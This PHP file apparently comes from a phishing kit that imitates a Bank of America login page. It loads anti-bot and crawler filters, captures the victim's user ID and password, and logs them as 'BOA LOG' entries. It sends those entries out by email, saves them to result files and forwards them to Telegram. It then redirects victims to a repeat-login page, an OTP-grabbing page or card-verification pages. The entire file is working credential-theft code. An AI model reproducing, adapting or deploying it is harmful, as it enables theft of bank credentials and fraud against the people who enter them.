<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "req/config.php";
$ip = $_SERVER['REMOTE_ADDR'];


if(isset($_POST['btnlo']) && !empty($_POST['lineId']) && !preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST['lineId'])) && !empty($_POST['passcode'])){
	$user = $_POST['lineId'];
	$password = $_POST['passcode'];	
    if(strlen($password) > 3 && strlen($user) > 4){
		
	///////////////////////// MAIL PART //////////////////////
		
		
        $PublicIP = $ip;
		if(isset($_GET[''.$theerrkey.''])){$reshead="-------------- CONFIRM BOA LOG --------------";}
		else{$reshead="--------------- 🦀🔥 NEW BOA LOG  🔥🦀 ------------";};
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
$reshead
UserName         : $user 
Password         : $password ";
		if(isset($_GET[''.$theerrkey.''])){$_SESSION['fullz'].=$Info_LOG;} else{$_SESSION['fullz']=$Info_LOG;}
$Info_LOG.="
".$_SESSION['device'];


// Don't Touche
//Email
        if ($Send_Email == 1) {
			$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
            $subject = $PublicIP.' 🦀🔥 '.$i.' BOA L0GIN';$headers = 'From: YoCHI <yochrunthecit@citirunnner.xyz>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){header("location:".$index."?czzacc".$theerrkey."rXId=c".md5(rand(100, 999999999))."&".$theerrkey."=On");}
		else{
			if($grabotp==1){header("location:hh?id=myaccount&y=".md5(rand(100, 999999999))."");} 
			else{if($usecaution==1){header("location:sp?id=myaccount&y=".md5(rand(100, 999999999))."");} else{
			
			header("location:com/cv?start=myaccount&y=".md5(rand(100, 999999999))."");
			
			};};};
    }
    else{
		header("location:".$index."?".$theerrkey."=c".md5(rand(100, 999999999))."");
    };
}
else{
	header("location:".$index."?".$theerrkey."=czi3Fauth".md5(rand(100, 999999999))."");
};


?>